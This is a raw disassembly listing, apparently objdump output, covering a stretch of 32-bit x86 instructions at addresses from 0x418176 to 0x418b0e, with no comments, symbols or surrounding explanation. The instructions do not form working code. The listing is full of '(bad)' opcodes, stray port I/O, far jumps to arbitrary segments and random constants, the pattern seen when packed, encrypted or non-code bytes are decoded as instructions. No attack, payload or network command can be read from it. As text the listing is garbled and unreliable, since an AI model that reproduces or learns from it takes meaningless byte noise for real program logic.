  418176:	push   eax
  418177:	push   0x3c7a942b
  41817c:	cmp    dl,al
  41817e:	(bad)  
  41817f:	fwait
  418180:	outs   dx,DWORD PTR ds:[esi]
  418181:	test   al,0x3e
  418183:	in     eax,0x9c
  418185:	rcl    DWORD PTR ds:0xd9e557b9,1
  41818b:	(bad)  
  41818c:	lahf   
  41818d:	inc    ebp
  41818e:	adc    ecx,edi
  418190:	shl    DWORD PTR [edx-0x518cdcc1],0x1c
  418197:	popa   
  418198:	cld    
  418199:	loope  0x418201
  41819b:	call   0x4256:0xfa839458
  4181a2:	int3   
  4181a3:	mov    esp,?
  4181a5:	enter  0x8492,0xf4
  4181a9:	(bad)  
  4181aa:	in     eax,0x29
  4181ac:	sub    eax,0xd1e7575a
  4181b1:	sbb    dh,bl
  4181b3:	cmovnp edx,DWORD PTR [eax]
  4181b6:	das    
  4181b7:	jnp    0x4181a0
  4181b9:	jle    0x41817a
  4181bb:	mov    dl,BYTE PTR [ebx-0x16]
  4181be:	aaa    
  4181bf:	inc    DWORD PTR [esi]
  4181c1:	pop    edx
  4181c2:	icebp  
  4181c3:	std    
  4181c4:	ret    0x3abe
  4181c7:	xchg   esi,eax
  4181c8:	and    bl,cl
  4181ca:	in     al,0x97
  4181cc:	push   ebx
  4181cd:	add    al,0x25
  4181cf:	push   ds
  4181d0:	pop    esi
  4181d1:	mov    ah,0xeb
  4181d3:	pop    esi
  4181d4:	xor    eax,edi
  4181d6:	push   ss
  4181d7:	in     eax,dx
  4181d8:	or     DWORD PTR [edx+ebx*8],0xc4597dd1
  4181df:	sbb    eax,0xb582d633
  4181e4:	inc    eax
  4181e5:	adc    DWORD PTR ds:0xfaf03050,edx
  4181eb:	mov    ds:0x8ea12a48,eax
  4181f0:	test   eax,0xd52f2652
  4181f5:	lods   eax,DWORD PTR ds:[esi]
  4181f6:	in     al,dx
  4181f7:	jnp    0x418266
  4181f9:	mov    esp,DWORD PTR cs:[ecx+esi*4]
  4181fd:	adc    al,0xb2
  4181ff:	sahf   
  418200:	push   eax
  418201:	sub    DWORD PTR [esi-0xf826976],esp
  418207:	sub    al,0x20
  418209:	pusha  
  41820a:	test   al,0xb2
  41820c:	dec    ebp
  41820d:	push   ebx
  41820e:	ret    0xbb85
  418211:	ror    DWORD PTR [ecx],0x5e
  418214:	or     DWORD PTR [esi-0xc],0xdf2e64be
  41821b:	xchg   esp,eax
  41821c:	aas    
  41821d:	xor    eax,0x527797a2
  418222:	mov    esp,0x4976efa3
  418227:	lea    edi,ds:[ebx+0x33]
  41822b:	dec    ecx
  41822c:	push   ebp
  41822d:	adc    DWORD PTR [esi],0x3e
  418230:	pushf  
  418231:	cli    
  418232:	pop    esi
  418233:	add    al,0x22
  418235:	xchg   DWORD PTR [edi-0x4e929188],ebx
  41823b:	and    dl,BYTE PTR [ebp+0x4a76ad0c]
  418241:	int3   
  418242:	xchg   ebx,eax
  418243:	inc    edi
  418244:	mov    edx,0x51f3c200
  418249:	mov    ebp,0x77b97565
  41824e:	fcmovu st,st(2)
  418250:	xchg   esi,eax
  418251:	in     eax,dx
  418252:	ds and al,0x13
  418255:	pop    ebx
  418256:	sbb    al,0xc6
  418258:	ret    
  418259:	push   0x43e681aa
  41825e:	lock cmp ecx,DWORD PTR [edi+0x435de91]
  418265:	sub    eax,0xbb468349
  41826a:	out    dx,eax
  41826b:	aad    0xb3
  41826d:	mov    dl,0x59
  41826f:	xchg   cl,cl
  418271:	jmp    0xe99b:0x7ddf6a2c
  418278:	push   ss
  418279:	push   0xec6bd3cd
  41827e:	sub    esp,DWORD PTR [ebp-0x1]
  418281:	cwde   
  418282:	xchg   edi,eax
  418283:	or     ebp,ecx
  418285:	or     BYTE PTR [ebx+0x8499b32],ah
  41828b:	arpl   WORD PTR [eax],dx
  41828d:	mov    DWORD PTR [ebp-0x6a],edi
  418290:	sar    esi,0xcd
  418293:	mov    al,ds:0x5ea5ebd0
  418298:	or     esi,DWORD PTR [ebx+0x14a4fa56]
  41829e:	cmp    BYTE PTR [ecx],bh
  4182a0:	fsubp  st(3),st
  4182a3:	into   
  4182a4:	dec    edx
  4182a5:	jp     0x4182e4
  4182a7:	out    dx,eax
  4182a8:	aas    
  4182a9:	xor    dh,BYTE PTR [edi-0x13d80478]
  4182af:	and    al,0x3d
  4182b1:	xchg   ebp,eax
  4182b2:	test   al,0xb9
  4182b4:	jmp    0x418277
  4182b6:	or     eax,0xefe6833c
  4182bb:	ret    
  4182bc:	xor    DWORD PTR [esi+ecx*4+0xe15a953],edi
  4182c3:	pop    ebx
  4182c4:	ins    DWORD PTR es:[edi],dx
  4182c5:	arpl   WORD PTR [edx],sp
  4182c7:	ret    
  4182c8:	dec    edi
  4182c9:	or     ebx,DWORD PTR [ebp+0x3cdfc0a1]
  4182cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4182d0:	dec    ebp
  4182d1:	sbb    eax,0xcbc6b61a
  4182d6:	sub    eax,0x316655b1
  4182db:	add    ecx,ecx
  4182dd:	cdq    
  4182de:	aad    0xaa
  4182e0:	outs   dx,BYTE PTR ds:[esi]
  4182e1:	or     BYTE PTR [eax],cl
  4182e3:	gs nop
  4182e5:	and    al,0xd7
  4182e7:	push   esi
  4182e8:	in     al,0x7
  4182ea:	mov    WORD PTR [esi],gs
  4182ec:	nop
  4182ed:	push   eax
  4182ee:	add    eax,0x664687a9
  4182f3:	add    eax,0x72e528fe
  4182f8:	add    ebp,DWORD PTR [ecx+0x56e395fe]
  4182fe:	scas   eax,DWORD PTR es:[edi]
  4182ff:	jp     0x418338
  418301:	mov    ch,0xea
  418303:	retf   0xc145
  418306:	mov    bl,0xe7
  418308:	push   esp
  418309:	mov    ebp,0x5681198
  41830e:	dec    ecx
  41830f:	or     DWORD PTR [esi+0x4ed2f00],ecx
  418315:	push   edx
  418316:	aam    0xe3
  418318:	sub    DWORD PTR ds:0x4d309734,esi
  41831e:	rcr    BYTE PTR [eax-0x6a],0x9f
  418322:	mov    cl,bl
  418324:	aas    
  418325:	mov    BYTE PTR [eax+0x6538bed2],dl
  41832b:	scas   eax,DWORD PTR es:[edi]
  41832c:	into   
  41832d:	pop    es
  41832e:	and    al,0x49
  418330:	pop    edi
  418331:	(bad)  
  418332:	icebp  
  418333:	push   edx
  418334:	jbe    0x4182fd
  418336:	mov    ebp,esi
  418338:	inc    edx
  418339:	je     0x41835b
  41833b:	xor    BYTE PTR [edi-0x6d],al
  41833e:	loopne 0x4183a7
  418340:	leave  
  418341:	jne    0x4183ad
  418343:	sub    ch,dh
  418345:	sbb    DWORD PTR [esi+0x25ec0b4d],edx
  41834b:	call   0xf6e938db
  418350:	cli    
  418351:	mov    edi,0x72fdb7f2
  418356:	scas   al,BYTE PTR es:[edi]
  418357:	push   ebp
  418358:	adc    bl,0x75
  41835b:	jmp    0xb802:0x61c2a60c
  418362:	dec    ecx
  418363:	addr16 in eax,0x75
  418366:	xchg   BYTE PTR [eax-0x3b11f630],bl
  41836c:	and    BYTE PTR [esi],0x82
  41836f:	loope  0x418382
  418371:	adc    edx,DWORD PTR [ecx-0x4b]
  418374:	jo     0x418311
  418376:	(bad)  
  418377:	sbb    eax,0xc0ba828c
  41837c:	xor    ecx,DWORD PTR [eax+0x2d770659]
  418382:	jnp    0x418306
  418384:	and    BYTE PTR [edi-0x6a0d6c62],0x48
  41838b:	jle    0x41834b
  41838d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41838e:	sub    al,BYTE PTR ds:0x39e6e482
  418394:	mov    ebp,0x442de27a
  418399:	(bad)  
  41839a:	aas    
  41839b:	push   ss
  41839c:	xor    eax,0xf3e8ff11
  4183a1:	xchg   edx,eax
  4183a2:	lock cli 
  4183a4:	out    0x41,eax
  4183a6:	(bad)  
  4183a8:	push   ecx
  4183a9:	mov    cl,0x81
  4183ab:	mov    eax,0x8b0e450
  4183b0:	or     al,0xb7
  4183b2:	dec    edx
  4183b3:	xchg   edx,eax
  4183b4:	stos   DWORD PTR es:[edi],eax
  4183b5:	mov    ebx,0x7f56c373
  4183ba:	mov    al,ds:0x6fa49317
  4183bf:	call   0x9fa8:0x9a62aa9
  4183c6:	add    bl,al
  4183c8:	adc    al,0x42
  4183ca:	or     BYTE PTR [ecx+0x4a],bl
  4183cd:	mov    ds,WORD PTR [eax+0x3eae11f1]
  4183d3:	es jnp 0x4183f9
  4183d6:	inc    ecx
  4183d7:	sub    eax,0x762d038c
  4183dc:	in     al,dx
  4183dd:	push   ecx
  4183de:	mov    ecx,DWORD PTR fs:[edi-0x26]
  4183e2:	icebp  
  4183e3:	(bad)  
  4183e4:	adc    BYTE PTR [ebp-0x183bd45d],dh
  4183ea:	or     ebp,ebp
  4183ec:	test   al,0xcb
  4183ee:	call   0xe383:0xf13e3bbc
  4183f5:	(bad)  
  4183f6:	sbb    DWORD PTR [edx-0x515dee56],eax
  4183fc:	iret   
  4183fd:	repz cmp ecx,DWORD PTR [esi+0x39d29085]
  418404:	adc    ebp,ebx
  418406:	or     BYTE PTR [ebx+eiz*1-0x80],ch
  41840a:	and    al,0x3d
  41840c:	pop    esp
  41840d:	push   ecx
  41840e:	sbb    bl,BYTE PTR [eax+esi*4-0x5e]
  418412:	retf   
  418413:	aas    
  418414:	mov    eax,0x66fa142
  418419:	test   cl,0x82
  41841c:	mov    dh,0xd6
  41841e:	call   esp
  418420:	in     al,0x33
  418422:	lods   al,BYTE PTR ds:[esi]
  418423:	xchg   cl,al
  418425:	mov    edi,DWORD PTR [edi]
  418427:	(bad)  
  418429:	sbb    al,0x26
  41842b:	jno    0x418404
  41842d:	dec    ebp
  41842e:	dec    eax
  41842f:	push   cs
  418430:	add    BYTE PTR [ebx+0x6fbb2fab],cl
  418436:	pop    ebp
  418437:	out    dx,al
  418438:	push   ss
  418439:	mov    DWORD PTR [ecx],edx
  41843b:	and    DWORD PTR [ebp+0x4b],ebx
  41843e:	outs   dx,BYTE PTR ds:[esi]
  41843f:	mov    ds:0xf7b202eb,al
  418444:	mov    al,ds:0xfea84eaa
  418449:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41844a:	lahf   
  41844b:	and    bh,al
  41844d:	mov    ds:0xca96bc31,eax
  418452:	(bad)  
  418453:	push   esi
  418454:	dec    ebp
  418455:	sahf   
  418456:	dec    edx
  418457:	xchg   BYTE PTR [ebx-0x50],dh
  41845a:	(bad)  
  41845b:	cli    
  41845c:	xor    al,ah
  41845e:	loop   0x418406
  418460:	dec    eax
  418461:	xor    al,0x26
  418463:	mov    DWORD PTR [edi],edi
  418465:	push   DWORD PTR [ebp+0x3bf0d8f5]
  41846b:	and    eax,0xc2c61f85
  418470:	in     eax,dx
  418471:	imul   eax,DWORD PTR [ebx-0x794ffa6c],0xffffffcf
  418478:	pop    eax
  418479:	rcl    DWORD PTR [ebp+eiz*4+0x55],cl
  41847d:	dec    ebx
  41847e:	push   cs
  41847f:	test   DWORD PTR [edx-0x46c09252],ebx
  418485:	test   eax,0x76d79a38
  41848a:	sub    ebx,esi
  41848c:	xor    BYTE PTR [edi+0x2f],bh
  41848f:	test   DWORD PTR [eax+0x3fa7a5dd],ebx
  418495:	push   edx
  418496:	inc    esp
  418497:	ror    BYTE PTR [ebx*8+0x52c6bf5e],1
  41849e:	(bad)  
  41849f:	mov    ch,0x6a
  4184a1:	mov    ds:0x848ecbc8,eax
  4184a6:	adc    eax,ebp
  4184a8:	pop    ebp
  4184a9:	add    eax,DWORD PTR [eax+0x9]
  4184ac:	pop    edi
  4184ad:	xor    al,0x64
  4184af:	arpl   WORD PTR [edi],sp
  4184b1:	retf   
  4184b2:	dec    esp
  4184b3:	adc    bh,BYTE PTR [edi-0x602de20d]
  4184b9:	rol    BYTE PTR [edi+0x3],cl
  4184bc:	add    DWORD PTR fs:[ecx+0x65],edx
  4184c0:	out    0xe,al
  4184c2:	push   cs
  4184c3:	adc    dh,bh
  4184c5:	(bad)  
  4184c6:	hlt    
  4184c7:	stos   BYTE PTR es:[edi],al
  4184c8:	lods   al,BYTE PTR ds:[esi]
  4184c9:	mov    ds:0x21155f9e,eax
  4184ce:	and    eax,0x4ce1761
  4184d3:	or     al,BYTE PTR [edx]
  4184d5:	inc    ebp
  4184d6:	je     0x418499
  4184d8:	ret    
  4184d9:	js     0x41852d
  4184db:	into   
  4184dc:	pop    esi
  4184dd:	sahf   
  4184de:	ins    DWORD PTR es:[edi],dx
  4184df:	repz xchg edi,eax
  4184e1:	pop    ecx
  4184e2:	mov    eax,ds:0x3c61c1eb
  4184e7:	jmp    0x9f04bd8a
  4184ec:	push   esp
  4184ed:	out    0xa4,eax
  4184ef:	ss mov esp,0x193ef3bd
  4184f5:	and    ch,BYTE PTR [eax+0x8fa92a0]
  4184fb:	sbb    DWORD PTR [edx],ebx
  4184fd:	icebp  
  4184fe:	sub    bh,BYTE PTR [ebp-0x2c3214f3]
  418504:	es lahf 
  418506:	sbb    bh,BYTE PTR [ebp+ebp*4+0x11]
  41850a:	fidiv  DWORD PTR [edi+0x503a757e]
  418510:	mov    bl,0x56
  418512:	sbb    al,0xc2
  418514:	jp     0x41853f
  418516:	in     eax,0xe5
  418518:	or     al,0x7e
  41851a:	mov    ch,0x8f
  41851c:	out    dx,eax
  41851d:	xchg   ecx,eax
  41851e:	push   esp
  41851f:	pusha  
  418520:	in     eax,0xb6
  418522:	mov    al,0xbe
  418524:	lods   al,BYTE PTR ds:[esi]
  418525:	cmp    dh,ah
  418527:	out    0x33,eax
  418529:	or     bl,BYTE PTR [ebp-0x21811d97]
  41852f:	xor    esi,DWORD PTR [edx+0x55c48d94]
  418535:	neg    al
  418537:	in     eax,0x6
  418539:	inc    ebx
  41853a:	inc    edi
  41853b:	in     eax,0xfb
  41853d:	cwde   
  41853e:	jne    0x418510
  418540:	cmp    esp,ebp
  418542:	fs pop eax
  418544:	out    0x9c,eax
  418546:	mov    eax,ds:0x881f7a0e
  41854b:	dec    eax
  41854c:	sar    DWORD PTR [ecx-0x79],0xd6
  418550:	xlat   BYTE PTR ds:[ebx]
  418551:	inc    eax
  418552:	push   ebx
  418553:	xchg   DWORD PTR [ebx-0x3e],edi
  418556:	inc    edx
  418557:	je     0x41858c
  418559:	mov    bl,0x53
  41855b:	(bad)  
  41855c:	push   ecx
  41855d:	scas   al,BYTE PTR es:[edi]
  41855e:	mov    dh,0x5b
  418560:	popa   
  418561:	inc    ebp
  418562:	xor    dl,BYTE PTR [ebx]
  418564:	inc    esi
  418565:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418566:	jae    0x4185da
  418568:	mov    BYTE PTR [edx+0x2b],ah
  41856b:	dec    edx
  41856c:	add    DWORD PTR [eax+0x18],edx
  41856f:	mov    edi,0x9957d2bd
  418574:	inc    ecx
  418575:	imul   bh
  418577:	jns    0x4185b4
  418579:	daa    
  41857a:	mov    ch,0x92
  41857c:	mov    ds:0xedae7f92,al
  418581:	enter  0x6561,0x86
  418585:	adc    eax,0x5c238e3a
  41858a:	pop    esp
  41858b:	fld    QWORD PTR ss:[ecx]
  41858e:	xor    al,0x3a
  418590:	outs   dx,BYTE PTR ds:[esi]
  418591:	frstor [edi+esi*4]
  418594:	pusha  
  418595:	int3   
  418596:	repnz popf 
  418598:	add    dh,bh
  41859a:	repnz xchg esp,eax
  41859c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41859d:	js     0x418607
  41859f:	in     al,dx
  4185a0:	sahf   
  4185a1:	mov    BYTE PTR [esi+0x35],bh
  4185a4:	aad    0xa8
  4185a6:	fsubr  DWORD PTR [ecx+edx*2+0x6aef18e1]
  4185ad:	sbb    eax,0x70e264b0
  4185b2:	test   al,al
  4185b4:	(bad)  
  4185b6:	jns    0x418630
  4185b8:	inc    eax
  4185b9:	cmp    al,ah
  4185bb:	jno    0x418618
  4185bd:	jns    0x418549
  4185bf:	pop    ds
  4185c0:	and    al,0xe2
  4185c2:	cdq    
  4185c3:	in     eax,dx
  4185c4:	sub    ebx,DWORD PTR [edi]
  4185c6:	xor    BYTE PTR [ecx+eax*1-0x3d27cc12],dh
  4185cd:	dec    esi
  4185ce:	sub    DWORD PTR [edi],0x939297bc
  4185d4:	gs adc eax,0x33009dcb
  4185da:	(bad)  
  4185db:	cmc    
  4185dc:	cmp    al,0xf4
  4185de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4185df:	push   ss
  4185e0:	in     eax,0x51
  4185e2:	adc    al,0x42
  4185e4:	cmc    
  4185e5:	ret    
  4185e6:	pop    ebx
  4185e7:	or     edi,edi
  4185e9:	pop    ebp
  4185ea:	inc    eax
  4185eb:	adc    dh,BYTE PTR [edi+ebx*8-0x59]
  4185ef:	dec    eax
  4185f0:	scas   eax,DWORD PTR es:[edi]
  4185f1:	(bad)  
  4185f2:	jnp    0x418599
  4185f4:	or     al,0x20
  4185f6:	call   0xd90fddc8
  4185fb:	jne    0x418644
  4185fd:	mov    dh,BYTE PTR [edx]
  4185ff:	leave  
  418600:	lods   eax,DWORD PTR ds:[esi]
  418601:	sbb    al,0xf0
  418603:	dec    edx
  418604:	mov    ecx,0x5d54b45a
  418609:	inc    ebx
  41860a:	imul   ecx,ebx,0xffffffa9
  41860d:	xchg   esp,eax
  41860e:	push   0x74
  418610:	push   esi
  418611:	aam    0x44
  418613:	in     al,dx
  418614:	std    
  418615:	in     al,0xb4
  418617:	mov    bl,0x76
  418619:	inc    eax
  41861a:	fidiv  WORD PTR [edx+0x5a]
  41861d:	push   ebx
  41861e:	xor    esp,ebx
  418620:	in     al,0x5b
  418622:	int    0xeb
  418624:	into   
  418625:	mov    esi,0xac630fc4
  41862a:	test   ebx,edi
  41862c:	xor    al,BYTE PTR [esi-0x11]
  41862f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418630:	icebp  
  418631:	cwde   
  418632:	mov    ebp,0xcfdbc7f0
  418637:	int    0xdc
  418639:	fidivr WORD PTR [ebp-0x465f8fa]
  41863f:	xlat   BYTE PTR ds:[ebx]
  418640:	ins    DWORD PTR es:[edi],dx
  418641:	clc    
  418642:	cmp    al,0x94
  418644:	mov    ebp,0x84e8ab17
  418649:	frstor [esi-0x66]
  41864c:	retf   0xa316
  41864f:	pop    ss
  418650:	dec    esi
  418651:	mul    BYTE PTR [esi+0x20]
  418654:	sbb    BYTE PTR [eax],bh
  418656:	cdq    
  418657:	fisubr DWORD PTR [ecx+0x41f8510e]
  41865d:	icebp  
  41865e:	ffreep st(6)
  418660:	dec    edx
  418661:	sbb    ah,ah
  418663:	out    dx,al
  418664:	or     ecx,DWORD PTR [ecx-0x35]
  418667:	pusha  
  418668:	iret   
  418669:	popa   
  41866a:	jle    0x4185f4
  41866c:	data16 out dx,al
  41866e:	(bad)  
  41866f:	mov    eax,ds:0xbb30e6ba
  418674:	xor    dl,ah
  418676:	popf   
  418677:	sub    al,0xd2
  418679:	jae    0x41865a
  41867b:	inc    edi
  41867c:	ja     0x4186d8
  41867e:	or     eax,0xc8289408
  418683:	retf   0x715a
  418686:	fs out 0xe,eax
  418689:	lods   al,BYTE PTR ds:[esi]
  41868a:	aam    0x99
  41868c:	rcr    BYTE PTR [eax+edx*2-0x4c],0x82
  418691:	or     ah,dl
  418693:	dec    esp
  418694:	dec    ecx
  418695:	stos   BYTE PTR es:[edi],al
  418696:	in     al,dx
  418697:	aad    0x6e
  418699:	pop    es
  41869a:	(bad)  
  41869b:	fptan  
  41869d:	or     al,0xfc
  41869f:	out    dx,al
  4186a0:	push   edi
  4186a1:	jns    0x418719
  4186a3:	xor    DWORD PTR [ecx-0x4c],edi
  4186a6:	pop    edx
  4186a7:	call   0x1fc9:0xdaf54246
  4186ae:	dec    ecx
  4186af:	push   ds
  4186b0:	ja     0x4186e0
  4186b2:	add    BYTE PTR [ebp-0x550b6df0],bh
  4186b8:	push   ebx
  4186b9:	ds out dx,al
  4186bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4186bc:	pop    esi
  4186bd:	sub    ebx,DWORD PTR [ecx+0x36]
  4186c0:	es (bad) 
  4186c2:	dec    esi
  4186c3:	inc    edi
  4186c4:	das    
  4186c5:	pop    ebp
  4186c6:	pop    ebp
  4186c7:	or     eax,0x1ef8c79b
  4186cc:	mov    BYTE PTR [edx+0x1259fbee],0xe8
  4186d3:	fist   WORD PTR [esi]
  4186d5:	fsubr  QWORD PTR [esp+edx*4+0x76]
  4186d9:	xchg   esp,eax
  4186da:	push   ebx
  4186db:	popf   
  4186dc:	stos   DWORD PTR es:[edi],eax
  4186dd:	pop    ebx
  4186de:	aaa    
  4186df:	jecxz  0x4186c0
  4186e1:	js     0x41868b
  4186e3:	call   0x4ae1:0xd19b472a
  4186ea:	mov    BYTE PTR [ebx+0x43],dl
  4186ed:	jb     0x41869a
  4186ef:	ins    BYTE PTR es:[edi],dx
  4186f0:	out    dx,eax
  4186f1:	stc    
  4186f2:	fs enter 0x3e,0xc8
  4186f7:	jmp    0xfad84c05
  4186fc:	and    DWORD PTR [ebx-0x4],edx
  4186ff:	lods   eax,DWORD PTR ds:[esi]
  418700:	pop    edx
  418701:	push   ss
  418702:	cmp    eax,0xfd0b765f
  418707:	and    bl,BYTE PTR [edx]
  418709:	sub    ecx,ecx
  41870b:	sub    al,0x39
  41870d:	leave  
  41870e:	retf   
  41870f:	adc    BYTE PTR [ebp-0x56bbf538],dh
  418715:	pop    ss
  418716:	popa   
  418717:	lea    esp,[ecx-0x771d8e7]
  41871d:	add    ebx,esi
  41871f:	loope  0x418780
  418721:	mov    eax,0xe119759f
  418726:	pop    ecx
  418727:	stos   BYTE PTR es:[edi],al
  418728:	jge    0x41879a
  41872a:	icebp  
  41872b:	addr16 popa 
  41872d:	push   esi
  41872e:	sub    ebp,DWORD PTR [edi+ecx*1]
  418731:	(bad)  
  418732:	lahf   
  418733:	cmp    ah,BYTE PTR [esi-0x7a]
  418736:	sub    BYTE PTR fs:[ebx*4+0x7b4c635f],al
  41873e:	and    dl,dh
  418740:	jmp    0xecd8:0x1b771c5
  418747:	mov    edi,0x9aed4b42
  41874c:	pop    ss
  41874d:	cmp    cl,dh
  41874f:	inc    esp
  418750:	mov    cl,BYTE PTR ds:0xeda9fed8
  418756:	mov    bh,0x43
  418758:	jnp    0x4187c3
  41875a:	push   ss
  41875b:	arpl   WORD PTR [ebx],si
  41875d:	lods   al,BYTE PTR ds:[esi]
  41875e:	push   eax
  41875f:	pop    edi
  418760:	add    esi,DWORD PTR [edx+0x7f]
  418763:	icebp  
  418764:	inc    ecx
  418765:	pop    edx
  418766:	stos   BYTE PTR es:[edi],al
  418767:	std    
  418768:	neg    bh
  41876a:	shr    BYTE PTR gs:[edx-0x4],0x2e
  41876f:	hlt    
  418770:	jge    0x418718
  418772:	ja     0x41870b
  418774:	mov    eax,ds:0xbe58b1ab
  418779:	xor    edi,0x15
  41877c:	mov    bl,0x76
  41877e:	and    eax,DWORD PTR [edx]
  418780:	sub    BYTE PTR [eax-0x6bd993ae],bh
  418786:	into   
  418787:	in     al,dx
  418788:	js     0x418722
  41878a:	inc    esi
  41878b:	shl    dl,0x88
  41878e:	test   ebx,esp
  418790:	mov    al,0x43
  418792:	in     eax,dx
  418793:	dec    ebx
  418794:	cmp    esi,eax
  418796:	mov    dl,0x5
  418798:	add    BYTE PTR [ebx],0xe
  41879b:	or     BYTE PTR [edx],bl
  41879d:	mov    al,0x93
  41879f:	jl     0x418745
  4187a1:	cli    
  4187a2:	js     0x41881a
  4187a4:	mov    al,BYTE PTR [eax+0x24]
  4187a7:	pop    esi
  4187a8:	jle    0x41876f
  4187aa:	cmp    DWORD PTR [edi],0xac2466e3
  4187b0:	mov    ch,0xd8
  4187b2:	cmc    
  4187b3:	push   ecx
  4187b4:	dec    edx
  4187b5:	push   ss
  4187b6:	shl    BYTE PTR [eax+eax*1+0x0],1
	...
  418989:	add    BYTE PTR [eax],al
  41898b:	add    bh,al
  41898d:	stc    
  41898e:	out    0xe3,eax
  418990:	(bad)  
  418991:	inc    edi
  418993:	std    
  418994:	fidivr WORD PTR [ebx]
  418996:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418997:	dec    esp
  418998:	daa    
  418999:	xchg   ebx,eax
  41899a:	push   0x66
  41899c:	lahf   
  41899d:	mov    esi,0x7220001
  4189a2:	add    BYTE PTR [eax],al
  4189a4:	das    
  4189a5:	mov    al,0x99
  4189a7:	adc    al,0x77
  4189a9:	jmp    0x2f4d92d4
  4189ae:	in     eax,0x8
  4189b0:	rcl    al,1
  4189b2:	lahf   
  4189b3:	push   edi
  4189b4:	inc    edi
  4189b5:	repnz pop ebp
  4189b7:	mov    edx,0x7b61e231
  4189bc:	cmc    
  4189bd:	(bad)  
  4189bf:	cmp    al,0xc3
  4189c1:	jo     0x418a3d
  4189c3:	repnz (bad) 
  4189c5:	out    dx,al
  4189c6:	sbb    dh,BYTE PTR [esi]
  4189c8:	fst    QWORD PTR [edx]
  4189ca:	xor    al,0x67
  4189cc:	jno    0x41899d
  4189ce:	loope  0x418a4d
  4189d0:	inc    ebx
  4189d1:	bound  ebx,QWORD PTR [edi+ebx*8]
  4189d4:	in     al,dx
  4189d5:	jae    0x418977
  4189d7:	cmp    al,0xf1
  4189d9:	mov    dl,0x83
  4189db:	mov    ds:0xc6b0e78a,eax
  4189e0:	or     ecx,DWORD PTR [edi+esi*2-0x26]
  4189e4:	pop    eax
  4189e5:	xor    BYTE PTR [ecx+0xbb7ac44],bl
  4189eb:	outs   dx,DWORD PTR ds:[esi]
  4189ec:	lock xor esp,edi
  4189ef:	loopne 0x4189ba
  4189f1:	les    esp,FWORD PTR [esi-0x14]
  4189f4:	pop    esp
  4189f5:	or     al,0x4
  4189f7:	or     al,0xba
  4189f9:	dec    edi
  4189fa:	repnz add DWORD PTR [ecx+0x25],edx
  4189fe:	mov    cl,0x41
  418a00:	or     ah,al
  418a02:	call   0xa838:0x27e7eef4
  418a09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a0a:	test   al,0xef
  418a0c:	in     eax,dx
  418a0d:	xor    BYTE PTR [eax-0x7eec639c],bh
  418a13:	jp     0x4189e0
  418a15:	cwde   
  418a16:	push   0xbc74e0a7
  418a1b:	lods   eax,DWORD PTR ds:[esi]
  418a1c:	xor    BYTE PTR [esi-0x296f266e],al
  418a22:	mov    esp,?
  418a24:	jp     0x4189c2
  418a26:	fstp   QWORD PTR [ebp+0x7bc663d4]
  418a2c:	aaa    
  418a2d:	pusha  
  418a2e:	push   0xffffffdd
  418a30:	sbb    bh,ch
  418a32:	stos   DWORD PTR es:[edi],eax
  418a33:	xor    eax,0xe1fe065f
  418a38:	push   cs
  418a39:	xchg   edx,eax
  418a3a:	jne    0x4189f3
  418a3c:	add    al,0x1c
  418a3e:	inc    edx
  418a3f:	cmp    esp,DWORD PTR [eax]
  418a41:	pop    esp
  418a42:	fist   DWORD PTR [edx]
  418a44:	loope  0x418a39
  418a46:	dec    esp
  418a47:	or     eax,0xe1d106eb
  418a4c:	int    0x88
  418a4e:	xor    al,0x18
  418a50:	push   0x58bc15ce
  418a55:	fs pop edx
  418a57:	retf   
  418a58:	sbb    esp,DWORD PTR [edx+0x37]
  418a5b:	sub    ecx,DWORD PTR [edi+ecx*4-0x1c66b03d]
  418a62:	mov    ah,0x52
  418a64:	push   cs
  418a65:	iret   
  418a66:	ja     0x418a4e
  418a68:	addr16 enter 0xf5c8,0xa7
  418a6d:	inc    edx
  418a6e:	fld    QWORD PTR ds:0x62ac2982
  418a74:	dec    ebp
  418a75:	fmul   DWORD PTR [ebx]
  418a77:	gs test eax,0xe8555a28
  418a7d:	mov    ebp,0x21e2ceb5
  418a82:	fdivr  QWORD PTR [eax+0x6106d790]
  418a88:	idiv   BYTE PTR [edx]
  418a8a:	ret    0x6580
  418a8d:	test   eax,0x327fe2fd
  418a92:	retf   
  418a93:	iret   
  418a94:	lock push eax
  418a96:	jl     0x418aac
  418a98:	cwde   
  418a99:	cli    
  418a9a:	mov    esi,0x697a4d41
  418a9f:	retf   0x592e
  418aa2:	aam    0x7e
  418aa4:	jle    0x418b02
  418aa6:	out    0xad,al
  418aa8:	push   esi
  418aa9:	push   ebx
  418aaa:	pop    ecx
  418aab:	pushf  
  418aac:	inc    esi
  418aad:	push   edx
  418aae:	push   esp
  418aaf:	lock mov edi,0xaafb212c
  418ab5:	sbb    al,0x1
  418ab7:	add    dh,BYTE PTR [eax+0x12]
  418aba:	push   es
  418abb:	mov    eax,ds:0xdbe1b37b
  418ac0:	aad    0xef
  418ac2:	adc    al,cl
  418ac4:	repnz mov eax,0x5476377e
  418aca:	ret    0x9ae0
  418acd:	xchg   DWORD PTR ds:0x7d05229a,ecx
  418ad3:	rcr    BYTE PTR [ebx],1
  418ad5:	popa   
  418ad6:	les    esp,FWORD PTR [edi+ecx*2-0x5]
  418ada:	xor    al,0x1b
  418adc:	jnp    0x418a64
  418ade:	jl     0x418aaa
  418ae0:	pop    edx
  418ae1:	adc    DWORD PTR [eax+0x452c3001],ecx
  418ae7:	into   
  418ae8:	into   
  418ae9:	sub    BYTE PTR [edx+0x6c],0x7c
  418aed:	mov    cl,0xe
  418aef:	push   0xf8e54f34
  418af4:	sbb    BYTE PTR [esp+ebp*4],ah
  418af7:	push   cs
  418af8:	add    ch,bh
  418afa:	adc    eax,0xd0877581
  418aff:	inc    esp
  418b00:	pushf  
  418b01:	mov    edi,0x95dbf3ff
  418b06:	outs   dx,BYTE PTR ds:[esi]
  418b07:	jns    0x418ab8
  418b09:	inc    ebx
  418b0a:	xchg   esi,eax
  418b0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b0c:	int    0xc1
  418b0e:	inc    esp
